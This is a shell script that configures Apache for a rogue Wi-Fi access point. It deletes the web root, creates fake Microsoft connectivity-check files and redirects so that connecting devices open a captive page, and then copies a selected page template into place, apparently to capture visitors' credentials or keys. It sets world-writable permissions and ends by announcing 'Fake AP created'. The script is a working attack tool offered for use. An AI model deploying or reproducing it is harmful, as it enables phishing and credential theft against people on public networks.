#!/bin/bash

page="$(cat page.txt)"
echo "${page}"
while [ -z "${page}" ]; do read -r ${page}; done
echo "Configuring apache..."
cd /srv/http/
rm -rf *
cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF
sleep 1;
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
mkdir generate_204
sleep 1;
cd /srv/http/generate_204/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /srv/http/
mkdir qrcode  # We need to create this folder because github doesn't like empty folder...
mkdir msftconnecttest
sleep 1;
mkdir msftnci
sleep 1;
cd /srv/http/msftnci/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
cd /srv/http/
mkdir redirect
sleep 1;
cd /srv/http/msftconnecttest/
mkdir qrcode  # We need to create this folder because github doesn't like empty folder...
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
cd /srv/http/redirect/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /srv/http/
cp -R /etc/${page}/* /srv/http/
sleep 2;
mv ${page}.php index.php
chown -R root:http /srv/http/*
sleep 1;
cd /srv/http/shout/
chown -R root:http /srv/http/shout/chat.txt
chmod 764 /srv/http/shout/chat.txt
chmod  777 *
cd /srv/http/msftconnecttest/
cp -R /etc/${page}/msftconnecttest/* /srv/http/msftconnecttest/
sleep 3;
cd /srv/http/msftconnecttest/
mv ${page}.php index.php
chown -R root:http /srv/http/*
sleep 1;
cd /srv/http/msftconnecttest/shout/
chown -R root:http /srv/http/msftconnecttest/shout/chat.txt
chmod 764 /srv/http/msftconnecttest/shout/chat.txt
chmod  777 *
cd /srv/http/msftconnecttest/
if [ -f "cle.txt" ];then
chmod 777 *
chown -R root:http /srv/http/msftconnecttest/cle.txt
chmod 764 /srv/http/msftconnecttest/cle.txt
apachectl restart
sleep 4;
cd /srv/http/
chmod 777 *
chown -R root:http /srv/http/cle.txt
chmod 764 /srv/http/cle.txt
apachectl restart
sleep 4;
echo "\e[1;32m[*] Fake AP created...\e[0m"
else
chmod 777 *
apachectl restart
sleep 4;
echo "\e[1;32m[*] Fake AP created...\e[0m"
fi